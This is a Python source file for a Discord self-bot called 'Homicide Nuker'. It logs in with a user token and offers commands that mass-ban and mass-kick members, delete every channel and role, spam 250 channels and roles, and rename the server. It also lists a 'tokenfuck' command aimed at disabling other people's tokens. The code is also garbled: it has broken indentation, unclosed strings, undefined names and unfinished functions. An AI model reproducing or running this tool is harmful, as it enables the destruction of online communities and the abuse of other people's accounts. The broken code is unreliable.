#THIS WAS MADE BY SFS & DAIN!
import asyncio
import datetime
import functools
import io
import json
import os
import random
import re
import string
import urllib.parse
import urllib.request
import time
from urllib import parse, request
from itertools import cycle
from bs4 import BeautifulSoup as bs4

import aiohttp
import colorama
import discord
import numpy
import requests
from PIL import Image
from colorama import Fore
from discord.ext import commands
from discord.utils import get
from gtts import gTTS



class NUKER():
    __version__=1


with open('config.json') as f:
    config = json.load(f)
class SELFBOT():
    __version__ = 1


with open('config.json') as f:
    config = json.load(f)

token = config.get('token')
password = config.get('password')
prefix = config.get('prefix')
 
       print(f'''{Fore.RESET}
                           _   _  ___  __  __ ___ ____ ___ ____  _____ 
                          | | | |/ _ \|  \/  |_ _/ ___|_ _|  _ \| ____|
                          | |_| | | | | |\/| || | |    | || | | |  _|  
                          |  _  | |_| | |  | || | |___ | || |_| | |___ 
                          |_| |_|\___/|_|  |_|___\____|___|____/|_____|

                 {Fore.CYAN}Homicide v1{Nuker.__version__} {Fore.GREEN}Logged in as= {Homocide.user.name}
                 {Fore.PINK}Prefix {Fore.BLUE}{Homocide.command.prefix}
		 {Fore.CYAN}Prefix: {Fore.BLUE}{Homicide.command_prefix}
    ''' + Fore.RESET)
 

def Clear():
    os.system('cls')


Clear()


def Init():
    token = config.get('token')
    try:
        Exeter.run(token, bot=False, reconnect=True)
        os.system(f'title (Homicide Nuker V1) - Version {NUKER.__version__}')
    except discord.errors.LoginFailure:
        print(f"{Fore.RED}[ERROR] {Fore.GREEN}Token has been passed" + Fore.RESET)
        os.system('pause >NUL')


class Login(discord.Client):
    async def on_connect(self):
        guilds = len(self.guilds)
        users = len(self.users)
        print("")
        print(f"Connected to: [{self.user.name}]")
        print(f"Token: {self.http.token}")
        print(f"Guilds: {guilds}")
        print(f"Users: {users}")
        print("-------------------------------")
        await self.logout()
	


def async_executor():
    def outer(func):
        @functools.wraps(func)
        def inner(*args, **kwargs):
            thing = functools.partial(func, *args, **kwargs)
            return loop.run_in_executor(None, thing)

        return inner

    return outer

toe = config.get('token')

@async_executor()
def do_tts(message):
    f = io.BytesIO()
    tts = gTTS(text=message.lower(), lang=tts_language)
    tts.write_to_fp(f)
    f.seek(0)
    return f


def Dump(ctx):
    for member in ctx.guild.members:
        f = open(f'Images/{ctx.guild.id}-Dump.txt', 'a+')
        f.write(str(member.avatar_url) + '\n')


def Nitro():
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    return f'https://discord.gift/{code}'


def RandomColor():
    randcolor = discord.Color(random.randint(0x000000, 0x00000))
    return randcolor	

def RandString():
    return "".join(random.choice(string.ascii_letters + string.digits) for i in range(random.randint(14, 32)))


colorama.init()
Homicide = discord.Client()
Homicide = commands.Bot(description='HOMICIDE NUKER', command_prefix=prefix, NUKER=True)


@Homicide.command()
async def help()
  await ctx.message.delete()
       embed = discord.Embed(color=6effff, timestamp=ctx.message.created_at)
       embed.set_author(name="𝙃𝙊𝙈𝙄𝘾𝙄𝘿𝙀 𝙉𝙐𝙆𝙀𝙍 > 𝙋𝙍𝙀𝙁𝙄𝙓: " + str(Homicide.command_prefix),
       eicon_url=Homicide.user.avatar_url)
       embed.set_thumbnail(url=Homicide.user.avatar_url)
        embded.set_image(url=https://cdn.discordapp.com/attachments/811601079556767804/811620027001339914/image0.gif)
        embed.add_field(name="\uD83E\uDDCA ACCOUNT", value="Shows all account commands", inline=False) 
        embed.add_field(name="\uD83E\uDDCA NUKE",value="Shows All Nuke Commands, inline=False)
        elif str(category).lower() == "account":
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image(url=https://cdn.discordapp.com/attachments/811638366948032572/811647467308187728/image0.gif)
        embed.description = f"\uD83D\uDCB0 `ACCOUNT COMMANDS`\n`> pfpsteal <user>` - steals the users pfp\n`> setpfp <link>` - sets the image-link as your pfp\n`> leavegroups` - leaves all groups that you're in\n`> stream <status>` - sets your streaming status\n`> playing <status>` - sets your playing status\n`> listening <status>` - sets your listening status\n`> watching <status>` - sets your watching status\n`> acceptfriends` - accepts all friend requests\n`> delfriends` - removes all your friends\n`> ignorefriends` - ignores all friends requests\n`> clearblocked` - clears your block-list\n`> read` - marks all messages as read\n`>
        elif str(category).lower() == "nuke":
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image(url=https://cdn.discordapp.com/attachments/810406991674998815/811637914550534174/image0.gif)
        embed.description = f"\uD83D\uDCB0 `NUKE COMMANDS`\n`> tokenfuck <token>` - disables the token\n`> nuke` - nukes the server\n`> massban` - bans everyone in the server\n`> masskick` - kicks everyone in the server\n`> spamroles` - spam makes 250 roles\n`> spamchannels` - spam makes 250 text channels\n`> delchannels` - deletes all channels in the server\n`> delroles` - deletes all roles in the server\n`> massunban` - unbans everyone\n`> renamechannels <name>` - renames all channels\n`> servername <name>` - renames the server to the specified name\n`> nickall <name>` - sets all user's nicknames to the specified name\n`> changeregion <amount>` - spam changes regions in groupchats\n`> kickgc` - kicks everyone in the gc\n`> spamgcname` - spam changes the groupchat name\n`> massmention <message>` - mass mentions random people"
        await ctx.send(embed=embed) 

        # ACCOUNT
        # NUKE
	
@Homicide.command()
async def exeter(ctx):
    await ctx.message.delete()
    await ctx.send("""	
                           _   _  ___  __  __ ___ ____ ___ ____  _____ 
                          | | | |/ _ \|  \/  |_ _/ ___|_ _|  _ \| ____|
                          | |_| | | | | |\/| || | |    | || | | |  _|  
                          |  _  | |_| | |  | || | |___ | || |_| | |___ 
                          |_| |_|\___/|_|  |_|___\____|___|____/|_____|
			   """)
			   
@Homicide.command(name='set-pfp', aliases=['setpfp', 'pfpset,"changepfp'])
async def _set_pfp(ctx, *, url):
    await ctx.message.delete()
    if config.get('password') == 'password-here':
        print(f"{Fore.RED}[ERROR] {Fore.CYAN}You didnt put your password in the config.json file" + Fore.RESET)
    else:
        password = config.get('password')


@Homicide.command()
async def acceptfriends(ctx):
    await ctx.message.delete()
    for relationship in Homicide.user.relationships:
        if relationship == discord.RelationshipType.incoming_request:
            await relationship.accept()


@Homicide.command()
async def ignorefriends(ctx):
    await ctx.message.delete()
    for relationship in Homicide.user.relationships:
        if relationship is discord.RelationshipType.incoming_request:
            relationship.delete()


@Homicide.command()
async def delfriends(ctx):
    await ctx.message.delete()
    for relationship in Homicide.user.relationships:
        if relationship is discord.RelationshipType.friend:
            await relationship.delete()


@Homicide.command()
async def clearblocked(ctx):
    await ctx.message.delete()
    print(Homicide.user.relationships)
    for relationship in Homicide.user.relationships:
        if relationship is discord.RelationshipType.blocked:
            print(relationship)
            await relationship.delete()


@Homicide.command(aliases=["streaming"])
async def stream(ctx, *, message):
    await ctx.message.delete()
    stream = discord.Streaming(
        name=message,
        url=stream_url,
    )
    await Homicide.change_presence(activity=stream)


@Homicide.command(alises=["game"])
async def playing(ctx, *, message):
    await ctx.message.delete()
    game = discord.Game(
        name=message
    )
    await Homicide.change_presence(activity=game)


@Homicide.command(aliases=["listen"])
async def listening(ctx, *, message):
    await ctx.message.delete()
    await Homicide.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.listening,
            name=message,
        ))


@Homicide.command(aliases=["watch"])
async def watching(ctx, *, message):
    await ctx.message.delete()
    await Homicide.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name=message
        ))


@Homicide.command(aliases=["stopstreaming", "stopstatus", "stoplistening", "stopplaying", "stopwatching"])
async def stopactivity(ctx):
    await ctx.message.delete()
    await Homicide.change_presence(activity=None, status=discord.Status.dnd)




@Homicide.command(aliases=['tokenfucker', 'disable', 'crash'])
async def tokenfuck(ctx, _token):
    await ctx.message.delete()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': _token,
    }

}
    token = config.get('token')
    headers = {
        'Authorization': token,
        'Content-Type': '.py',
}


@Homicide.command(aliases=["nuked", "wizzed"])
async def destroy(ctx):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            pass
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name=Homicide(),
            description="Homicide Was Here LMAO",
            reason="Homicide LMAO",
            icon=None,
            banner=None
                )
    except:
        pass
    for _i in range(250):
        await ctx.guild.create_text_channel(name="nuked by homicide")
    for _i in range(250):
        await ctx.guild.create_role(name="nuked by homicide", color=RandomColor())

@Homicide.command(aliases=["banwave", "banall", "etb"])
async def massban(ctx):
    await ctx.message.delete()
    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.ban(reason="Homicide Was Here Fool!")
        except:
            pass 


@Homicide.command(aliases=["kickall", "kickwave"])
async def masskick(ctx):
    await ctx.message.delete()
    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.kick(reason="Sorry, Homicide pulled up.")
        except:
            pass


@Homicide.command(aliases=["spamroles"])
async def massrole(ctx):
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_role(name="Homicide", color=RandomColor())
        except:
            return 


@Homicide.command(aliases=["masschannels", "masschannel", "ctc"])
async def spamchannels(ctx):
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_text_channel(name="homicide was here")
        except:
            return


@Homicide.command(aliases=["delchannel"])
async def delchannels(ctx):
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            return


@Homicide.command(aliases=["deleteroles"])
async def delroles(ctx):
    await ctx.message.delete()
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass

@Homicide.command(aliases=["purgebans", "unbanall"])
async def massunban(ctx):
    await ctx.message.delete()
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
        except:
            pass


@Homicide.command(aliases=["renameserver", "nameserver"])
async def servername(ctx, *, name):
    await ctx.message.delete()
    await ctx.guild.edit(name=name)


@Homicide.command()
async def prefix(ctx, prefix):
    await ctx.message.delete()
    Homicide.command_prefix = str(prefix)	
			
@Homicide.command(aliases=["logout"])
async def shutdown(ctx):
    await ctx.message.delete()
    await Homicide.logout()			
